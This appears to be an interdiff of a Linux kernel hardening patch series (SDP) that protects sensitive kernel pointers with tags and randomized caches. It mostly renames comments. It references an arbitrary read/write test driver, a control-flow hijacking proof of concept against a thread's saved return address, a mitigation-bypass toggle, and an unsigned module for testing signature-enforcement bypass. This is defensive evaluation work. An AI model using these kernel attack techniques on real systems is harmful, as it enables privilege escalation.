-+// FZY: Control-flow hijacking proof of concept that overwrites the saved ra register in task_struct.thread to redirect a sleeping thread's execution to a kernel function
++// SDP: Control-flow hijacking proof of concept that overwrites the saved ra register in task_struct.thread to redirect a sleeping thread's execution to a kernel function
 +//   1. Fork a child process
 +//   2. Child gets its own task_struct address via ioctl, reports it, then sleeps
 +//   3. Parent overwrites the child's thread_struct.ra with thread_hijack_target
@@ -9222,7 +9221,7 @@ index 000000000000..11e4046666df
 +           thread_offset, thread_ptr);
 +
 +    printf("[parent] SDP mode: thread pointer (tagged): 0x%lx\n", thread_ptr);
-+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
++    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
 +    // thread_ptr = thread_ptr | 0xFFFF000000000000;
 +
 +    ra_addr = thread_ptr;
@@ -9279,11 +9278,11 @@ index 000000000000..4fd86e2d62c4
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/test/sdp_cache_test.c b/drivers/misc/arbrw/test/sdp_cache_test.c
 new file mode 100644
-index 000000000000..e01a4555f4ac
+index 000000000000..3518cad53669
 --- /dev/null
 +++ b/drivers/misc/arbrw/test/sdp_cache_test.c
 @@ -0,0 +1,73 @@
-+// FZY: User space test for the sdp cache feature
++// SDP: User space test for the sdp cache feature
 +// Opens /dev/arb_rw and issues the ARB_SDP_CACHE_TEST ioctl, which:
 +//   1. Creates an sdp_cache with 64-byte objects at a randomized vmalloc address
 +//   2. Allocates two objects from the cache
@@ -9358,11 +9357,11 @@ index 000000000000..e01a4555f4ac
 +}
 diff --git a/drivers/misc/testmod/Kconfig b/drivers/misc/testmod/Kconfig
 new file mode 100644
-index 000000000000..4762bdaf4903
+index 000000000000..ae2ff5d2e360
 --- /dev/null
 +++ b/drivers/misc/testmod/Kconfig
 @@ -0,0 +1,7 @@
-+# FZY: Config for the simple test module
++# SDP: Config for the simple test module
 +config TEST_MODULE
 +	tristate "Hello World Module"
 +	help
@@ -9371,20 +9370,20 @@ index 000000000000..4762bdaf4903
 +	  If unsure, say N.
 diff --git a/drivers/misc/testmod/Makefile b/drivers/misc/testmod/Makefile
 new file mode 100644
-index 000000000000..5f874493267b
+index 000000000000..534732b99416
 --- /dev/null
 +++ b/drivers/misc/testmod/Makefile
 @@ -0,0 +1,2 @@
-+# FZY: Add the test module to Makefile
++# SDP: Add the test module to Makefile
 +obj-$(CONFIG_TEST_MODULE) += hello.o
 \ No newline at end of file
 diff --git a/drivers/misc/testmod/hello.c b/drivers/misc/testmod/hello.c
 new file mode 100644
-index 000000000000..5092099c2b52
+index 000000000000..e48c44631a9f
 --- /dev/null
 +++ b/drivers/misc/testmod/hello.c
 @@ -0,0 +1,20 @@
-+// FZY: A simple unsigned hello world module for testing sig_enforce bypass
++// SDP: A simple unsigned hello world module for testing sig_enforce bypass
 +#include <linux/module.h>
 +#include <linux/kernel.h>
 +#include <linux/init.h>
@@ -9406,7 +9405,7 @@ index 000000000000..5092099c2b52
 +module_exit(hello_exit);
 \ No newline at end of file
 diff --git a/drivers/tty/tty_io.c b/drivers/tty/tty_io.c
-index 8a94e5a43c6d..6eec050b805e 100644
+index 8a94e5a43c6d..6109de08e594 100644
 --- a/drivers/tty/tty_io.c
 +++ b/drivers/tty/tty_io.c
 @@ -1104,8 +1104,30 @@ static ssize_t file_tty_write(struct file *file, struct kiocb *iocb, struct iov_
@@ -9414,7 +9413,7 @@ index 8a94e5a43c6d..6eec050b805e 100644
   *	each device.
   */
 +
-+// FZY: User space init end marker
++// SDP: User space init end marker
 +#ifdef SDP_INSTCOUNT
 +#include <asm/csr.h>
 +static atomic_t sdp_login_marker_fired = ATOMIC_INIT(0);
@@ -9433,7 +9432,7 @@ index 8a94e5a43c6d..6eec050b805e 100644
 +
  static ssize_t tty_write(struct kiocb *iocb, struct iov_iter *from)
  {
-+// FZY: User space init end marker at user login prompt
++// SDP: User space init end marker at user login prompt
 +#ifdef SDP_INSTCOUNT
 +	sdp_maybe_fire_login_marker();
 +#endif
@@ -9441,14 +9440,14 @@ index 8a94e5a43c6d..6eec050b805e 100644
  }
  
 diff --git a/fs/coredump.c b/fs/coredump.c
-index 9d235fa14ab9..20fdc4b7a602 100644
+index 9d235fa14ab9..f4f863cd115e 100644
 --- a/fs/coredump.c
 +++ b/fs/coredump.c
 @@ -53,12 +53,26 @@
  
  #include <trace/events/sched.h>
  
-+// FZY: Include sdp_cache.h to allocate core_pattern from sdp_cache instead of kmalloc
++// SDP: Include sdp_cache.h to allocate core_pattern from sdp_cache instead of kmalloc
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -9460,11 +9459,11 @@ index 9d235fa14ab9..20fdc4b7a602 100644
  static unsigned int core_pipe_limit;
 -static char core_pattern[CORENAME_MAX_SIZE] = "core";
 +
-+// FZY: Store the core_pattern string on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the core_pattern string on heap, store its pointer in the global section, and mark it as __tag1
 +// static char core_pattern[CORENAME_MAX_SIZE] = "core";
 +static char *__tag1 core_pattern;
 +
-+// FZY: sdp_cache for core_pattern allocation
++// SDP: sdp_cache for core_pattern allocation
 +#ifdef CONFIG_SDP_CACHE
 +static struct sdp_cache *core_pattern_cache;
 +#endif
@@ -9477,7 +9476,7 @@ index 9d235fa14ab9..20fdc4b7a602 100644
  
  	if (ispipe) {
 -		int argvs = sizeof(core_pattern) / 2;
-+		// FZY: core_pattern is a char *__tag1 now, sizeof(core_pattern) will always return the size of a pointer, not the size of the string
++		// SDP: core_pattern is a char *__tag1 now, sizeof(core_pattern) will always return the size of a pointer, not the size of the string
 +		// int argvs = sizeof(core_pattern) / 2;
 +		int argvs = strlen(core_pattern) / 2;
 +
@@ -9490,7 +9489,7 @@ index 9d235fa14ab9..20fdc4b7a602 100644
  		.procname	= "core_pattern",
 -		.data		= core_pattern,
 +
-+		// FZY: coredump_sysctls is a global variable, so it cannot be initialized with a dynamic value. We will fill this field later in init_fs_coredump_sysctls
++		// SDP: coredump_sysctls is a global variable, so it cannot be initialized with a dynamic value. We will fill this field later in init_fs_coredump_sysctls
 +		// .data		= core_pattern,
 +		.data		= NULL,
 +
@@ -9502,7 +9501,7 @@ index 9d235fa14ab9..20fdc4b7a602 100644
  static int __init init_fs_coredump_sysctls(void)
  {
 +
-+	// FZY: Initialize core_pattern from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise use kzalloc
++	// SDP: Initialize core_pattern from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise use kzalloc
 +#ifdef CONFIG_SDP_CACHE
 +	core_pattern_cache = sdp_cache_create("core_pattern", CORENAME_MAX_SIZE, cache_line_size());
 +	if (!core_pattern_cache) {
@@ -9524,21 +9523,21 @@ index 9d235fa14ab9..20fdc4b7a602 100644
 +
 +	strncpy(core_pattern, "core", 5);
 +
-+	// FZY: Initialize coredump_sysctls[1].data. It does not need to be marked with __tag1, because it is only accessed during initialization and attackers cannot modify it at runtime
++	// SDP: Initialize coredump_sysctls[1].data. It does not need to be marked with __tag1, because it is only accessed during initialization and attackers cannot modify it at runtime
 +	coredump_sysctls[1].data = core_pattern;
 +
  	register_sysctl_init("kernel", coredump_sysctls);
  	return 0;
  }
 diff --git a/fs/fs_struct.c b/fs/fs_struct.c
-index 64c2d0814ed6..5c8031fd7c3d 100644
+index 64c2d0814ed6..9dfce2ad426f 100644
 --- a/fs/fs_struct.c
 +++ b/fs/fs_struct.c
 @@ -8,6 +8,16 @@
  #include <linux/fs_struct.h>
  #include "internal.h"
  
-+// FZY: Include sdp_cache.h to allocate fs_struct from sdp_cache instead of kmem_cache
++// SDP: Include sdp_cache.h to allocate fs_struct from sdp_cache instead of kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#define alloc_fs_struct()	((struct fs_struct *)sdp_cache_alloc(fs_sdp_cache))
@@ -9557,7 +9556,7 @@ index 64c2d0814ed6..5c8031fd7c3d 100644
  	path_put(&fs->pwd);
 -	kmem_cache_free(fs_cachep, fs);
 +
-+	// FZY: Free fs_struct to sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise free to kmem_cache
++	// SDP: Free fs_struct to sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise free to kmem_cache
 +	free_fs_cache(fs);
  }
  
@@ -9567,13 +9566,13 @@ index 64c2d0814ed6..5c8031fd7c3d 100644
  struct fs_struct *copy_fs_struct(struct fs_struct *old)
  {
 -	struct fs_struct *fs = kmem_cache_alloc(fs_cachep, GFP_KERNEL);
-+	// FZY: Free fs_struct to sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise free to kmem_cache
++	// SDP: Free fs_struct to sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise free to kmem_cache
 +	struct fs_struct *fs = alloc_fs_struct();
  	/* We don't need to lock fs - think why ;-) */
  	if (fs) {
  		fs->users = 1;
 diff --git a/include/linux/bpf.h b/include/linux/bpf.h
-index 49f8b691496c..71c3ce8a8311 100644
+index 49f8b691496c..414366d3cacc 100644
 --- a/include/linux/bpf.h
 +++ b/include/linux/bpf.h
 @@ -2135,7 +2135,9 @@ static inline void bpf_map_dec_elem_count(struct bpf_map *map)
@@ -9582,7 +9581,7 @@ index 49f8b691496c..71c3ce8a8311 100644
  
 -extern int sysctl_unprivileged_bpf_disabled;
 +// extern int sysctl_unprivileged_bpf_disabled;
-+// FZY: Store the sysctl_unprivileged_bpf_disabled value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the sysctl_unprivileged_bpf_disabled value on heap, store its pointer in the global section, and mark it as __tag1
 +extern int *__tag1 sysctl_unprivileged_bpf_disabled_ptr;
  
  static inline bool bpf_allow_ptr_leaks(void)
@@ -9592,20 +9591,20 @@ index 49f8b691496c..71c3ce8a8311 100644
  static inline bool unprivileged_ebpf_enabled(void)
  {
 -	return !sysctl_unprivileged_bpf_disabled;
-+	// FZY: Adjust the reference of sysctl_unprivileged_bpf_disabled
++	// SDP: Adjust the reference of sysctl_unprivileged_bpf_disabled
 +	return !*sysctl_unprivileged_bpf_disabled_ptr;
  }
  
  /* Not all bpf prog type has the bpf_ctx.
 diff --git a/include/linux/fs_struct.h b/include/linux/fs_struct.h
-index 783b48dedb72..55a0a582cb6d 100644
+index 783b48dedb72..fd6096b1c60b 100644
 --- a/include/linux/fs_struct.h
 +++ b/include/linux/fs_struct.h
 @@ -15,7 +15,13 @@ struct fs_struct {
  	struct path root, pwd;
  } __randomize_layout;
  
-+// FZY: Allocate fs_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
++// SDP: Allocate fs_struct from sdp_cache if CONFIG_SDP_CACHE is enabled, otherwise allocate from kmem_cache
 +#ifdef CONFIG_SDP_CACHE
 +struct sdp_cache;
 +extern struct sdp_cache *fs_sdp_cache;
@@ -9616,14 +9615,14 @@ index 783b48dedb72..55a0a582cb6d 100644
  extern void exit_fs(struct task_struct *);
  extern void set_fs_root(struct fs_struct *, const struct path *);
 diff --git a/include/linux/genalloc.h b/include/linux/genalloc.h
-index 0bd581003cd5..c3cd18c5c345 100644
+index 0bd581003cd5..b946f86980d9 100644
 --- a/include/linux/genalloc.h
 +++ b/include/linux/genalloc.h
 @@ -209,6 +209,13 @@ extern struct gen_pool *gen_pool_get(struct device *dev, const char *name);
  extern bool gen_pool_has_addr(struct gen_pool *pool, unsigned long start,
  			size_t size);
  
-+// FZY: Expose these for use in sdp_cache
++// SDP: Expose these for use in sdp_cache
 +extern struct gen_pool_chunk *gen_pool_find_chunk(struct gen_pool *pool,
 +						  unsigned long addr);
 +extern void gen_pool_free_in_chunk(struct gen_pool *pool,
@@ -9634,7 +9633,7 @@ index 0bd581003cd5..c3cd18c5c345 100644
  extern struct gen_pool *of_gen_pool_get(struct device_node *np,
  	const char *propname, int index);
 diff --git a/include/linux/kmod.h b/include/linux/kmod.h
-index 68f69362d427..2736707dc728 100644
+index 68f69362d427..15211e4d9999 100644
 --- a/include/linux/kmod.h
 +++ b/include/linux/kmod.h
 @@ -17,7 +17,14 @@
@@ -9643,18 +9642,18 @@ index 68f69362d427..2736707dc728 100644
  #ifdef CONFIG_MODULES
 -extern char modprobe_path[]; /* for sysctl */
 +
-+// FZY: Store the modprobe_path string on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the modprobe_path string on heap, store its pointer in the global section, and mark it as __tag1
 +// extern char modprobe_path[]; /* for sysctl */
 +extern char *__tag1 modprobe_path;
 +
-+// FZY: Initialize modprobe_path from sdp_cache
++// SDP: Initialize modprobe_path from sdp_cache
 +void modprobe_path_init(void);
 +
  /* modprobe exit status on success, -ve on error.  Return value
   * usually useless though. */
  extern __printf(2, 3)
 diff --git a/include/linux/mm.h b/include/linux/mm.h
-index bf5d0b1b16f4..df473817a6b1 100644
+index bf5d0b1b16f4..531bb47d1351 100644
 --- a/include/linux/mm.h
 +++ b/include/linux/mm.h
 @@ -27,6 +27,9 @@
@@ -9662,7 +9661,7 @@ index bf5d0b1b16f4..df473817a6b1 100644
  #include <linux/sched.h>
  #include <linux/pgtable.h>
 +
-+// FZY: Include for the sdp page table pool
++// SDP: Include for the sdp page table pool
 +#include <linux/sdp_pgtable.h>
  #include <linux/kasan.h>
  #include <linux/memremap.h>
@@ -9671,7 +9670,7 @@ index bf5d0b1b16f4..df473817a6b1 100644
  
  static inline struct ptdesc *virt_to_ptdesc(const void *x)
  {
-+	// FZY: sdp pool page tables live outside the linear mapping
++	// SDP: sdp pool page tables live outside the linear mapping
 +	if (sdp_pt_is_pool_va(x))
 +		return page_ptdesc(pfn_to_page(sdp_pt_virt_to_pfn(x)));
 +
@@ -9682,7 +9681,7 @@ index bf5d0b1b16f4..df473817a6b1 100644
  
  static inline void *ptdesc_address(const struct ptdesc *pt)
  {
-+	// FZY: sdp pool page tables live outside the linear mapping
++	// SDP: sdp pool page tables live outside the linear mapping
 +	unsigned long pfn = page_to_pfn(ptdesc_page(pt));
 +
 +	if (sdp_pt_is_pool_pfn(pfn))
@@ -9698,7 +9697,7 @@ index bf5d0b1b16f4..df473817a6b1 100644
 -	struct page *page = alloc_pages(gfp | __GFP_COMP, order);
 +	struct page *page;
 +
-+	// FZY: Take single page tables from the hidden sdp pool, fall back to the
++	// SDP: Take single page tables from the hidden sdp pool, fall back to the
 +	// buddy allocator before the pool is up and when it is exhausted
 +	if (!order) {
 +		void *va = sdp_pt_alloc();
@@ -9717,7 +9716,7 @@ index bf5d0b1b16f4..df473817a6b1 100644
  	struct page *page = ptdesc_page(pt);
 +	unsigned long pfn = page_to_pfn(page);
 +
-+	// FZY: Return sdp pool pages to the pool, not to the buddy allocator
++	// SDP: Return sdp pool pages to the pool, not to the buddy allocator
 +	if (sdp_pt_is_pool_pfn(pfn)) {
 +		sdp_pt_free(sdp_pt_pfn_to_virt(pfn));
 +		return;
@@ -9731,20 +9730,20 @@ index bf5d0b1b16f4..df473817a6b1 100644
  	unsigned long mask = ~(PTRS_PER_PMD * sizeof(pmd_t) - 1);
 -	return virt_to_page((void *)((unsigned long) pmd & mask));
 +
-+	// FZY: virt_to_ptdesc() knows about the sdp pool, virt_to_page() does not
++	// SDP: virt_to_ptdesc() knows about the sdp pool, virt_to_page() does not
 +	return ptdesc_page(virt_to_ptdesc((void *)((unsigned long) pmd & mask)));
  }
  
  static inline struct ptdesc *pmd_ptdesc(pmd_t *pmd)
 diff --git a/include/linux/mm_types.h b/include/linux/mm_types.h
-index 36c5b43999e6..5d12f592a5e1 100644
+index 36c5b43999e6..032546ef3e79 100644
 --- a/include/linux/mm_types.h
 +++ b/include/linux/mm_types.h
 @@ -701,7 +701,13 @@ struct mm_struct {
  		unsigned long mmap_compat_legacy_base;
  #endif
  		unsigned long task_size;	/* size of task vm space */
-+		// FZY: Mark the page table root pointer as __tag1, so that it can
++		// SDP: Mark the page table root pointer as __tag1, so that it can
 +		// only be read and written with ld_sdp/sd_sdp
 +#ifdef CONFIG_SDP_PGTABLE
 +		pgd_t *__tag1 pgd;
@@ -9759,7 +9758,7 @@ index 36c5b43999e6..5d12f592a5e1 100644
  #define MM_MT_FLAGS	(MT_FLAGS_ALLOC_RANGE | MT_FLAGS_LOCK_EXTERN | \
  			 MT_FLAGS_USE_RCU)
 +
-+// FZY: Define init_mm as a marco to avoid changing all the code referencing it
++// SDP: Define init_mm as a marco to avoid changing all the code referencing it
 +#ifdef CONFIG_SDP_CACHE
 +extern struct mm_struct __boot_init_mm;
 +extern struct mm_struct *__tag1 __init_mm_ptr;
@@ -9771,7 +9770,7 @@ index 36c5b43999e6..5d12f592a5e1 100644
  /* Pointer magic because the dynamic array size confuses some compilers. */
  static inline void mm_init_cpumask(struct mm_struct *mm)
 diff --git a/include/linux/panic.h b/include/linux/panic.h
-index 6717b15e798c..d2592f6f82e3 100644
+index 6717b15e798c..bd276616b199 100644
 --- a/include/linux/panic.h
 +++ b/include/linux/panic.h
 @@ -18,7 +18,9 @@ extern bool oops_may_print(void);
@@ -9780,13 +9779,13 @@ index 6717b15e798c..d2592f6f82e3 100644
  extern unsigned long panic_print;
 -extern int panic_on_oops;
 +// extern int panic_on_oops;
-+// FZY: Store the panic_on_oops value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the panic_on_oops value on heap, store its pointer in the global section, and mark it as __tag1
 +extern int *__tag1 panic_on_oops_ptr;
  extern int panic_on_unrecovered_nmi;
  extern int panic_on_io_nmi;
  extern int panic_on_warn;
 diff --git a/include/linux/printk.h b/include/linux/printk.h
-index 8ef499ab3c1e..792a9eda64d4 100644
+index 8ef499ab3c1e..ee7b127f9d21 100644
 --- a/include/linux/printk.h
 +++ b/include/linux/printk.h
 @@ -326,7 +326,9 @@ extern void __printk_cpu_sync_put(void);
@@ -9795,13 +9794,13 @@ index 8ef499ab3c1e..792a9eda64d4 100644
  
 -extern int kptr_restrict;
 +// extern int kptr_restrict;
-+// FZY: Store the kptr_restrict value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the kptr_restrict value on heap, store its pointer in the global section, and mark it as __tag1
 +extern int *__tag1 kptr_restrict_ptr;
  
  /**
   * pr_fmt - used by the pr_*() macros to generate the printk format string
 diff --git a/include/linux/sched.h b/include/linux/sched.h
-index 77f01ac385f7..af3e04272fca 100644
+index 77f01ac385f7..5790a9ecee11 100644
 --- a/include/linux/sched.h
 +++ b/include/linux/sched.h
 @@ -873,7 +873,8 @@ struct task_struct {
@@ -9809,7 +9808,7 @@ index 77f01ac385f7..af3e04272fca 100644
  #endif
  
 -	struct mm_struct		*mm;
-+	// FZY: Protect task_struct.mm with __tag1
++	// SDP: Protect task_struct.mm with __tag1
 +	struct mm_struct		*__tag1 mm;
  	struct mm_struct		*active_mm;
  
@@ -9820,7 +9819,7 @@ index 77f01ac385f7..af3e04272fca 100644
  	/* Effective (overridable) subjective task credentials (COW): */
 -	const struct cred __rcu		*cred;
 +
-+	// FZY: Protect task_struct.cred with __tag1
++	// SDP: Protect task_struct.cred with __tag1
 +	const struct cred __rcu		*__tag1 cred;
  
  #ifdef CONFIG_KEYS
@@ -9830,7 +9829,7 @@ index 77f01ac385f7..af3e04272fca 100644
  #endif
  	/* Filesystem information: */
 -	struct fs_struct		*fs;
-+	// FZY: Protect task_struct.fs with __tag1
++	// SDP: Protect task_struct.fs with __tag1
 +	struct fs_struct		*__tag1 fs;
  
  	/* Open file information: */
@@ -9840,7 +9839,7 @@ index 77f01ac385f7..af3e04272fca 100644
  
  	/* Namespaces: */
 -	struct nsproxy			*nsproxy;
-+	// FZY: Protect task_struct.nsproxy with __tag1
++	// SDP: Protect task_struct.nsproxy with __tag1
 +	struct nsproxy			*__tag1 nsproxy;
  
  	/* Signal handlers: */
@@ -9849,7 +9848,7 @@ index 77f01ac385f7..af3e04272fca 100644
  	randomized_struct_fields_end
  
  	/* CPU-specific state of this task: */
-+	// FZY: Protect thread_struct by allocating it in sdp_cache and storing its __tag1 pointer in task_struct
++	// SDP: Protect thread_struct by allocating it in sdp_cache and storing its __tag1 pointer in task_struct
 +#ifdef CONFIG_SDP_CACHE
 +	struct thread_struct		*__tag1 thread;
 +#else
@@ -9862,7 +9861,7 @@ index 77f01ac385f7..af3e04272fca 100644
  	 */
  };
  
-+// FZY: Uniform access to thread_struct regardless of whether it is embedded or a pointer
++// SDP: Uniform access to thread_struct regardless of whether it is embedded or a pointer
 +#ifdef CONFIG_SDP_CACHE
 +#define task_thread_ptr(tsk) ((tsk)->thread)
 +#else
@@ -9874,11 +9873,11 @@ index 77f01ac385f7..af3e04272fca 100644
  	return task->thread_pid;
 diff --git a/include/linux/sdp_cache.h b/include/linux/sdp_cache.h
 new file mode 100644
-index 000000000000..28cf20db9669
+index 000000000000..b4d54158381d
 --- /dev/null
 +++ b/include/linux/sdp_cache.h
 @@ -0,0 +1,16 @@
-+// FZY: Header for the sdp cache, for random allocation of sensitive data
++// SDP: Header for the sdp cache, for random allocation of sensitive data
 +
 +#ifndef _LINUX_SDP_CACHE_H
 +#define _LINUX_SDP_CACHE_H
@@ -9893,14 +9892,14 @@ index 000000000000..28cf20db9669
 +void sdp_cache_free(struct sdp_cache *cache, void *ptr);
 +void sdp_cache_destroy(struct sdp_cache *cache);
 +
-+#endif /* _LINUX_SDP_CACHE_H */
++#endif // _LINUX_SDP_CACHE_H
 diff --git a/include/linux/sdp_pgtable.h b/include/linux/sdp_pgtable.h
 new file mode 100644
-index 000000000000..0de8d2177695
+index 000000000000..8337cf3a3c22
 --- /dev/null
 +++ b/include/linux/sdp_pgtable.h
-@@ -0,0 +1,65 @@
-+// FZY: Header for the sdp page table pool, for hidden allocation of page tables
+@@ -0,0 +1,64 @@
++// SDP: Header for the sdp page table pool, for hidden allocation of page tables
 +
 +#ifndef _LINUX_SDP_PGTABLE_H
 +#define _LINUX_SDP_PGTABLE_H
@@ -9911,10 +9910,9 @@ index 000000000000..0de8d2177695
 +
 +#ifdef CONFIG_SDP_PGTABLE
 +
-+// A __tag1 slot only holds its TTag as long as nothing writes over it
-+// with plain stores. The settag passes stamp the tag at the definition site
-+// (do_ctors() for statics, the allocation site for heap objects), so anything
-+// that blanks a whole object behind our back wipes them again.
++// A __tag1 slot keeps its TTag only until a plain store overwrites it. The settag
++// passes stamp the tag at the definition site (do_ctors() for statics, the alloc
++// site for heap objects), so anything that blanks a whole object wipes them
 +#if defined(CONFIG_INIT_ON_ALLOC_DEFAULT_ON) || \
 +    defined(CONFIG_INIT_ON_FREE_DEFAULT_ON) || \
 +    defined(CONFIG_SLUB_DEBUG_ON)
@@ -9950,7 +9948,7 @@ index 000000000000..0de8d2177695
 +// sdp_pt_virt_to_pfn()/sdp_pt_pfn_to_virt() are defined in
 +// arch/riscv/include/asm/pgtable-64.h, where PGDIR_SIZE is known
 +
-+#else /* !CONFIG_SDP_PGTABLE */
++#else // !CONFIG_SDP_PGTABLE
 +
 +#define __sdp_tag1
 +
@@ -9962,11 +9960,11 @@ index 000000000000..0de8d2177695
 +#define sdp_pt_virt_to_pfn(va)	virt_to_pfn(va)
 +#define sdp_pt_pfn_to_virt(pfn)	((void *)pfn_to_virt(pfn))
 +
-+#endif /* CONFIG_SDP_PGTABLE */
++#endif // CONFIG_SDP_PGTABLE
 +
-+#endif /* _LINUX_SDP_PGTABLE_H */
++#endif // _LINUX_SDP_PGTABLE_H
 diff --git a/include/linux/sysctl.h b/include/linux/sysctl.h
-index 09d7429d67c0..80e3e1783383 100644
+index 09d7429d67c0..6fed3a6decbf 100644
 --- a/include/linux/sysctl.h
 +++ b/include/linux/sysctl.h
 @@ -68,8 +68,16 @@ int proc_dostring(struct ctl_table *, int, void *, size_t *, loff_t *);
@@ -9974,13 +9972,13 @@ index 09d7429d67c0..80e3e1783383 100644
  		size_t *lenp, loff_t *ppos);
  int proc_dointvec(struct ctl_table *, int, void *, size_t *, loff_t *);
 +
-+// FZY: New proc handler for panic_on_oops
++// SDP: New proc handler for panic_on_oops
 +int proc_dointvec_panic_on_oops(struct ctl_table *, int, void *, size_t *, loff_t *);
 +
  int proc_douintvec(struct ctl_table *, int, void *, size_t *, loff_t *);
  int proc_dointvec_minmax(struct ctl_table *, int, void *, size_t *, loff_t *);
 +
-+// FZY: New proc handler for io_uring_disabled
++// SDP: New proc handler for io_uring_disabled
 +int proc_dointvec_minmax_io_uring_disabled(struct ctl_table *, int, void *, size_t *, loff_t *);
 +
  int proc_douintvec_minmax(struct ctl_table *table, int write, void *buffer,
@@ -9999,7 +9997,7 @@ index 6d35728b94b2..c5ccd992e366 100644
  config IRQ_WORK
  	bool
 diff --git a/init/init_task.c b/init/init_task.c
-index ff6c4b9bfe6b..02aaaa8408bf 100644
+index ff6c4b9bfe6b..c1a2e09051e5 100644
 --- a/init/init_task.c
 +++ b/init/init_task.c
 @@ -84,7 +84,14 @@ struct task_struct init_task
@@ -10007,7 +10005,7 @@ index ff6c4b9bfe6b..02aaaa8408bf 100644
  	.nr_cpus_allowed= NR_CPUS,
  	.mm		= NULL,
 +
-+	// FZY: Initialize .active_mm to &__boot_init_mm during init and change it to &init_mm after it is migrated to sdp_cache
++	// SDP: Initialize .active_mm to &__boot_init_mm during init and change it to &init_mm after it is migrated to sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +	.active_mm	= &__boot_init_mm,
 +#else
@@ -10018,14 +10016,14 @@ index ff6c4b9bfe6b..02aaaa8408bf 100644
  		.fn = do_no_restart_syscall,
  	},
 diff --git a/init/main.c b/init/main.c
-index 436d73261810..d98bfd7ad281 100644
+index 436d73261810..fd935458d171 100644
 --- a/init/main.c
 +++ b/init/main.c
 @@ -105,6 +105,10 @@
  #include <asm/setup.h>
  #include <asm/sections.h>
  #include <asm/cacheflush.h>
-+// FZY: csr_write()/CSR_MSDPC/SDP_ENABLE_CHECKS for the sdp code below
++// SDP: csr_write()/CSR_MSDPC/SDP_ENABLE_CHECKS for the sdp code below
 +#ifdef CONFIG_RISCV
 +#include <asm/csr.h>
 +#endif
@@ -10036,7 +10034,7 @@ index 436d73261810..d98bfd7ad281 100644
  	memblock_free(unknown_options, len);
  }
  
-+// FZY: Forward declare do_ctors() to move it earlier than all accesses to global sensitive pointers
++// SDP: Forward declare do_ctors() to move it earlier than all accesses to global sensitive pointers
 +static void __init do_ctors(void);
 +
  asmlinkage __visible __init __no_sanitize_address __noreturn __no_stack_protector
@@ -10045,7 +10043,7 @@ index 436d73261810..d98bfd7ad281 100644
  	char *command_line;
  	char *after_dashes;
  
-+// FZY: Kernel init start marker
++// SDP: Kernel init start marker
 +#ifdef SDP_INSTCOUNT
 +	csr_write(CSR_MSDPC, 0x10);
 +#endif
@@ -10058,7 +10056,7 @@ index 436d73261810..d98bfd7ad281 100644
  	setup_nr_cpu_ids();
  	setup_per_cpu_areas();
 +
-+	// FZY: Do per-cpu set_tag, before any per-cpu sensitive field can be read
++	// SDP: Do per-cpu set_tag, before any per-cpu sensitive field can be read
 +	do_ctors();
 +
  	smp_prepare_boot_cpu();	/* arch-specific boot-cpu hooks */
@@ -10070,7 +10068,7 @@ index 436d73261810..d98bfd7ad281 100644
  	init_irq_proc();
 -	do_ctors();
 +
-+	// FZY: Move do_ctors() earlier to avoid accessing global sensitive pointers before their set_tag
++	// SDP: Move do_ctors() earlier to avoid accessing global sensitive pointers before their set_tag
 +	// do_ctors();
 +
  	do_initcalls();
@@ -10080,12 +10078,12 @@ index 436d73261810..d98bfd7ad281 100644
  
  	do_sysctl_args();
  
-+// FZY: Enable sdp checks at the end of kernel init
++// SDP: Enable sdp checks at the end of kernel init
 +#ifdef SDP_ENABLE_CHECKS
 +	arch_sdp_enable();
 +#endif
 +
-+// FZY: Kernel init end marker
++// SDP: Kernel init end marker
 +#ifdef SDP_INSTCOUNT
 +	csr_read_set(CSR_MSDPC, 0x20);
 +#endif
@@ -10093,7 +10091,7 @@ index 436d73261810..d98bfd7ad281 100644
  	if (ramdisk_execute_command) {
  		ret = run_init_process(ramdisk_execute_command);
 +
-+// FZY: User space init start marker
++// SDP: User space init start marker
 +#ifdef SDP_INSTCOUNT
 +		if (!ret) {
 +			csr_read_set(CSR_MSDPC, 0x40);
@@ -10111,21 +10109,21 @@ index 436d73261810..d98bfd7ad281 100644
  	padata_init();
  	page_alloc_init_late();
  
-+	// FZY: Initialize modprobe_path from sdp_cache
++	// SDP: Initialize modprobe_path from sdp_cache
 +	modprobe_path_init();
 +
  	do_basic_setup();
  
  	kunit_run_all_tests();
 diff --git a/io_uring/io_uring.c b/io_uring/io_uring.c
-index 8d1bc6cdfe71..28f6ed65be01 100644
+index 8d1bc6cdfe71..d64817a08a06 100644
 --- a/io_uring/io_uring.c
 +++ b/io_uring/io_uring.c
 @@ -98,6 +98,11 @@
  #include "rw.h"
  #include "alloc_cache.h"
  
-+// FZY: Include sdp_cache.h to allocate sysctl_io_uring_disabled in sdp_cache
++// SDP: Include sdp_cache.h to allocate sysctl_io_uring_disabled in sdp_cache
 +#ifdef CONFIG_SDP_CACHE
 +#include <linux/sdp_cache.h>
 +#endif
@@ -10139,7 +10137,7 @@ index 8d1bc6cdfe71..28f6ed65be01 100644
  
 -static int __read_mostly sysctl_io_uring_disabled;
 +// static int __read_mostly sysctl_io_uring_disabled;
-+// FZY: Store the sysctl_io_uring_disabled value on heap, store its pointer in the global section, and mark it as __tag1
++// SDP: Store the sysctl_io_uring_disabled value on heap, store its pointer in the global section, and mark it as __tag1
 +static int *__tag1 sysctl_io_uring_disabled_ptr;
 +
  static int __read_mostly sysctl_io_uring_group = -1;
@@ -10150,12 +10148,12 @@ index 8d1bc6cdfe71..28f6ed65be01 100644
  		.procname	= "io_uring_disabled",
 -		.data		= &sysctl_io_uring_disabled,
